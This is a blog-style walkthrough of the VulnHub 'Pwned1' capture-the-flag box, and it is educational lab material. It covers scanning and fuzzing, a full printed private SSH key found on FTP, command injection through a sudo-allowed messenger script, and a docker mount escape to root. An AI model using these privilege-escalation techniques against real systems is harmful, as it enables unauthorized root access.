@@ -1,0 +1,188 @@
+I"�<h2 id="introduction">Introduction</h2>
+<p>This is partical room from tryhackme entitled “Pwned1” form vulnhub. Difficulty of This box is Intermediate and in this box you will learn all about Fuzzing diretory, Custom exploitation, and getting privilage of root. Okay no let’s Pwn this box :p.</p>
+
+<h2 id="scanning">Scanning</h2>
+
+<p>As usual we will scan the ip of the box.</p>
+<pre><code>$ nmap -sV -sC 192.168.80.95  
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-28 00:29 WIB
+Nmap scan report for 192.168.80.95
+Host is up (0.26s latency).
+Not shown: 996 closed ports
+PORT    STATE    SERVICE        VERSION
+21/tcp  open     ftp            vsftpd 3.0.3
+22/tcp  open     ssh            OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 fe:cd:90:19:74:91:ae:f5:64:a8:a5:e8:6f:6e:ef:7e (RSA)
+|   256 81:32:93:bd:ed:9b:e7:98:af:25:06:79:5f:de:91:5d (ECDSA)
+|_  256 dd:72:74:5d:4d:2d:a3:62:3e:81:af:09:51:e0:14:4a (ED25519)
+80/tcp  open     http           Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Pwned....!!
+777/tcp filtered multiling-http
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                              
+Nmap done: 1 IP address (1 host up) scanned in 44.66 seconds
+</code></pre>
+<p>As you can see the box have 3 port open and 1 port filtered. Let’s take a look at web apache.</p>
+
+<p><img src="/assets/vulnhub_pwned1/bg.png" alt="img" /></p>
+
+<p>Nothing to see here but let’s take a look at robots.txt .</p>
+<pre><code># Group 1
+
+User-agent: *
+Allow: /nothing
+Allow: /hidden_text
+
+</code></pre>
+<p>There are have something interesting, i’m trying to fuzzing directory with gobuster in /hidden_text then i found secret.dic :</p>
+<pre><code>secret.dic : 
+
+/hacked
+/vanakam_nanba
+/hackerman.gif 
+/facebook
+/whatsapp
+/instagram
+/pwned
+/pwned.com
+/pubg 
+/cod
+/fortnite
+/youtube
+/kali.org
+/hacked.vuln
+/users.vuln
+/passwd.vuln
+/pwned.vuln
+/backup.vuln
+/.ssh
+/root
+/home
+
+</code></pre>
+<p>So i’m trying to fuzz again and i found page in /pwned.vuln.</p>
+
+<p><img src="/assets/vulnhub_pwned1/bg_1.png" alt="img" /></p>
+
+<p>in this case i’m don’t do injection like sql but just take a look the source code and we found user ftp!.</p>
+
+<p><img src="/assets/vulnhub_pwned1/bg_2.png" alt="img" /></p>
+
+<p>Now i’m going to login ftpuser with password we found before.</p>
+
+<p><img src="/assets/vulnhub_pwned1/bg_3.png" alt="img" /></p>
+
+<h2 id="getting-user">Getting User</h2>
+
+<p>As you can see we found folder secret which contains id_rsa and note.txt :</p>
+<ul>
+  <li>id_rsa
+    <pre><code>-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+</code></pre>
+  </li>
+  <li>note.txt :</li>
+</ul>
+
+<pre><code>Wow you are here 
+
+ariana won't happy about this note 
+
+sorry ariana :( 
+
+</code></pre>
+
+<h3 id="user-ariana">User ariana</h3>
+
+<p>You can see we did it so easyly. Now lets login with user credential .</p>
+
+<p><img src="/assets/vulnhub_pwned1/bg_4.png" alt="img" /></p>
+
+<p>Then let’s take a look at permission of the user ariana <code>sudo -l</code>.</p>
+<pre><code>ariana@pwned:/home$ sudo -l
+Matching Defaults entries for ariana on pwned:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User ariana may run the following commands on pwned:
+    (selena) NOPASSWD: /home/messenger.sh
+</code></pre>
+
+<p>There is permission of ariana to execute bash of selena. Content of messenger.sh is :</p>
+
+<pre><code class="language-bash">#!/bin/bash
+
+clear
+echo "Welcome to linux.messenger "
+                echo ""
+users=$(cat /etc/passwd | grep home |  cut -d/ -f 3)
+                echo ""
+echo "$users"
+                echo ""
+read -p "Enter username to send message : " name 
+                echo ""
+read -p "Enter message for $name :" msg
+                echo ""
+echo "Sending message to $name "
+
+$msg 2&gt; /dev/null
+
+                echo ""
+echo "Message sent to $name :) "
+                echo ""
+</code></pre>
+<h3 id="user-selena">User Selena</h3>
+
+<p>Now we can getting user selena with put <code>bash -i</code> in messenger to <code>selena</code>.</p>
+
+<p><img src="/assets/vulnhub_pwned1/bg_5.png" alt="img" /></p>
+
+<h2 id="privilage-escalation">Privilage Escalation</h2>
+
+<p>As you can see selena have permission with docker, then we can escaping from docker and getting a root with this command <code>docker run -v /:/mnt --rm -it alpine chroot /mnt bash</code>:</p>
+
+<p><img src="/assets/vulnhub_pwned1/bg_6.png" alt="img" /></p>
+
+<p>Now we are root</p>
+
+<p>So thats it my writeup i hope you enjoy , Happy hacking :D</p>
+:ET
